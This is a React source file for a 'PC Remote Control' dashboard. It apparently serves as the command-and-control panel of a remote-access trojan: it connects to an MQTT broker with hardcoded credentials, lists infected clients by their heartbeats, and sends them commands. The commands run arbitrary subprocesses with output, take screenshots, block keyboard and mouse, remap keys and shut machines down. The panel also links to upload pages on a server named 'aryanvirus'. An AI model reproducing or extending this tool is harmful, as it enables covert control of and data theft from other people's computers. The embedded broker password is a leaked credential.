import React, { useEffect, useState } from "react";
import mqtt from "mqtt";
import "./Home.css";
import Keyboard from "./Keyboard";
import MouseTouchpad from "./MouseTouchPad";


export default function App() {
  const [client, setClient] = useState(null);
  const [connected, setConnected] = useState(false);
  const [log, setLog] = useState([]);
  const [clients, setClients] = useState({});
  const [selectedClient, setSelectedClient] = useState("");
  const [inputValue, setInputValue] = useState("");
  const [heartEffect, setHeartEffect] = useState(false);
  const [confirmEnabled, setConfirmEnabled] = useState(true);

  const [panel,setPanel] = useState(true)

  const BROKER = "wss://n171f1d9.ala.eu-central-1.emqxsl.com:8084/mqtt";

  // MQTT connection
  useEffect(() => {
    const options = {
      username: "aryanvish2006",
      password: "aryanvish2006saniya",
      reconnectPeriod: 2000,
      clean: true,
    };

    const mqttClient = mqtt.connect(BROKER, options);
    setClient(mqttClient);

    mqttClient.on("connect", () => {
      setConnected(true);
      mqttClient.subscribe("heartbeat/+"); // heartbeat subscription
      mqttClient.subscribe("ack/+"); // ack subscription
      mqttClient.subscribe("control/broadcast"); // broadcast support
      mqttClient.subscribe("trace/+");
      setLog(prev => [...prev, "Connected to MQTT broker"]);
    });

    mqttClient.on("message", (topic, message) => {
      if (topic.startsWith("heartbeat/")) {
        const clientId = topic.split("/")[1];
        setClients(prev => ({ ...prev, [clientId]: Date.now() }));
      } else {
        setLog(prev => [...prev, `ACK: ${message.toString()}`]);
      }
    });

    mqttClient.on("error", (err) => {
      setLog(prev => [...prev, "Error: " + err.message]);
    });

    return () => mqttClient.end();
  }, []);

  // Mark offline clients
  useEffect(() => {
    const interval = setInterval(() => {
      const now = Date.now();
      setClients(prev => {
        const updated = { ...prev };
        for (let id in updated) {
          if (!updated[id] || now - updated[id] > 30000) updated[id] = null;
        }
        return updated;
      });
    }, 5000);
    return () => clearInterval(interval);
  }, []);

  // Send command
  const sendCommand = (command, requiresInput) => {
    if (!client) return;
    if (requiresInput && !inputValue.trim()) {
      alert("Input cannot be empty!");
      return;
    }
    if (confirmEnabled) {
      if (!window.confirm(`Send command: ${command}?`)) return;
    }

    // Broadcast or individual
    if (selectedClient === "broadcast") {
      Object.keys(clients).forEach(id => {
        if (clients[id]) client.publish(`control/${id}`, command.trim());
      });
      client.publish("control/broadcast", command.trim());
    } else {
      const target = selectedClient || "broadcast";
      client.publish(`control/${target}`, command.trim());
    }

    setLog(prev => [...prev, `Sent to ${selectedClient || "broadcast"}: ${command}`]);
    setInputValue("");
  };

  return (
    <div className="container">
      <h2>PC Remote Control</h2>
      <p>
        Status: {connected ? "🟢 Connected" : "🔴 Disconnected"} | Clients Online:{" "}
        {Object.values(clients).filter(ts => ts).length}
      </p>
      
      <div className="top-controls">
        <select value={selectedClient} onChange={e => setSelectedClient(e.target.value)}>
          <option value="">Select Client</option>
          {Object.entries(clients).map(([id, ts]) => (
            <option key={id} value={id}>{id} {ts ? "🟢" : "🔴"}</option>
          ))}
          <option value="broadcast">Broadcast</option>
        </select>

        <input value={inputValue} onChange={e => setInputValue(e.target.value)} placeholder="Type value..." />

        <label className="custom-checkbox">
          <input type="checkbox" checked={heartEffect} onChange={e => setHeartEffect(e.target.checked)} />
          <span>Heart Effect</span>
        </label>

        <label className="custom-checkbox">
          <input type="checkbox" checked={confirmEnabled} onChange={e => setConfirmEnabled(e.target.checked)} />
          <span>Confirm Before Send</span>
        </label>
        <button style={{backgroundColor:"#c52b2bff",marginLeft:10}} onClick={() => {
  localStorage.removeItem("auth");
  window.location.href = "/";
}}>Logout</button>
<button style={{backgroundColor:"#2ba4c5ff",marginLeft:10}} onClick={() => {
  setPanel(!panel)
}}>Keyboard</button>
      </div>
      {panel?<div>
      {/* PC Controls */}
      <div className="controls-group">
        <strong>PC Controls</strong>
        <button style={{ backgroundColor: "#e67e22" }} onClick={() => sendCommand("shutdown", false)}>Shutdown</button>
        <button style={{ backgroundColor: "#f39c12" }} onClick={() => sendCommand("lock", false)}>Lock</button>
        <button style={{ backgroundColor: "#2980b9" }} onClick={() => sendCommand("desktop", false)}>Show Desktop</button>
        <button style={{ backgroundColor: "#8e44ad" }} onClick={() => sendCommand("close", false)}>Close Window</button>
        <button style={{ backgroundColor: "#f1c40f" }} onClick={() => sendCommand("screenshot", false)}>Screenshot</button>
        <button style={{ backgroundColor: "#7f8c8d" }} onClick={() => sendCommand("end", false)}>End Script</button>
      </div>

      {/* Input & Alerts */}
      <div className="controls-group">
        <strong>Input & Alerts</strong>
        <button style={{ backgroundColor: "#e74c3c" }} onClick={() => sendCommand("block", false)}>Block Both</button>
        <button style={{ backgroundColor: "#c0392b" }} onClick={() => sendCommand("blockkeyboard", false)}>Block Keyboard</button>
        <button style={{ backgroundColor: "#c0392b" }} onClick={() => sendCommand("blockmouse", false)}>Block Mouse</button>
        <button style={{ backgroundColor: "#27ae60" }} onClick={() => sendCommand("unblock", false)}>Unblock All</button>
        <button style={{ backgroundColor: "#e84393" }} onClick={() => sendCommand(`notepadtype${heartEffect ? "heart" : ""} ${inputValue}`, true)}>Notepad Type</button>
        <button style={{ backgroundColor: "#d35400" }} onClick={() => sendCommand(`alertprompt ${inputValue}`, true)}>Alert Prompt</button>
        <button style={{ backgroundColor: "#e67e22" }} onClick={() => sendCommand(`inputprompt ${inputValue}`, true)}>Input Prompt</button>
        <button style={{ backgroundColor: "#16a085" }} onClick={() => sendCommand(`type ${inputValue}`, true)}>Type</button>
        <button style={{ backgroundColor: "#3498db" }} onClick={() => sendCommand(`press ${inputValue}`, true)}>Press Key</button>
        <button style={{ backgroundColor: "#2ecc71" }} onClick={() => sendCommand(`backspace ${inputValue}`, true)}>Backspace</button>
        <button style={{ backgroundColor: "#9b59b6" }} onClick={() => sendCommand(`remap ${inputValue}`, true)}>Remap Key</button>
        <button style={{ backgroundColor: "#8e44ad" }} onClick={() => sendCommand(`swapkey ${inputValue}`, true)}>Swap Key</button>
        <button style={{ backgroundColor: "#9b59b6" }} onClick={() => sendCommand(`browser ${inputValue}`, true)}>Open Browser</button>
        <button style={{ backgroundColor: "#34495e" }} onClick={() => sendCommand(`subprocess ${inputValue}`, true)}>Run Subprocess</button>
        <button style={{ backgroundColor: "#5e4c34ff" }} onClick={() => sendCommand(`cmdwithoutput ${inputValue}`, true)}>Output Subprocess</button>
      </div>

      {/* Server access */}

      <div className="controls-group">
        <strong>Server Links</strong>
        <button style={{ backgroundColor: "#2980b9" }} onClick={() => window.open("https://aryanvirus.onrender.com/trace")}>Trace</button>
        <button style={{ backgroundColor: "#8e44ad" }} onClick={() => window.open("https://aryanvirus.onrender.com/listuploads")}>List Uploads</button>
        <button style={{ backgroundColor: "#f1c40f" }} onClick={() => window.open("https://aryanvirus.onrender.com/latestupload")}>Latest Upload</button>
        <button style={{ backgroundColor: "#7f8c8d" }} onClick={() => window.open("https://aryanvirus.onrender.com/showuploads")}>All Uploads</button>
      </div>
</div>:<div><Keyboard sendCommand={sendCommand} />
<MouseTouchpad/></div>}
      <div className="logs">
        <h3>Logs</h3>
        {log.map((l, i) => (<div key={i}>{l}</div>))}
      </div>
    </div>
  );
}
